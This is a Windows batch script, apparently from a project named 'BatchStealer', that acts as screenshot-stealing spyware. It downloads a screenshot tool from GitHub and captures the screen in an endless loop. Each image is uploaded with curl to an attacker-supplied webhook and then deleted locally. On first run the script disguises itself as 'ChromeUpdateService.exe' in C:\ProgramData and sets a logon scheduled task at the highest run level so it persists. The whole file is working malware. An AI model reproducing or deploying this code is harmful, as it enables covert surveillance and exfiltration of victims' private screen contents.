@echo off
:init
set "webhook=<your_webhook>"
set "ssurl=https://github.com/Takaovi/BatchStealer/raw/main/screenshot.exe?raw=true"

if exist %localappdata%\nft.ssmaster goto notFirstTime
else (
goto yesFirstTime
)

:notFirstTime
if exist %temp%\ss.exe goto delExe
else (
    goto continue
)

:continue
curl --silent -L --fail "%ssurl%" -o ss.exe
timeout 5 >nul
move ss.exe %temp%
:redo
cd %temp%
start ss.exe -wh 1e9060a -o screenshot.png
timeout 1 >nul
curl --silent --output /dev/null -F ss=@"%temp%\screenshot.png" %webhook%
timeout 5 >nul
del /f /q screenshot.png
goto redo

:delExe
del /f %temp%\ss.exe
if exist %temp%\screenshot.png goto delPng
else (
goto :continue
)


:delPng
del /f %temp%\screenshot.png
goto continue

:yesFirstTime
cd %localappdata%
echo Initialiazed >nft.ssmaster
cd %~dp0
copy %~n0%~x0 C:\ProgramData
cd C:\ProgramData
ren %~n0%~x0 ChromeUpdateService.exe
schtasks /create /tn "ChromeUpdService" /sc onlogon /rl highest /tr "C:\ProgramData\ChromeUpdateService.exe" /ru "%username%"
goto notFirstTime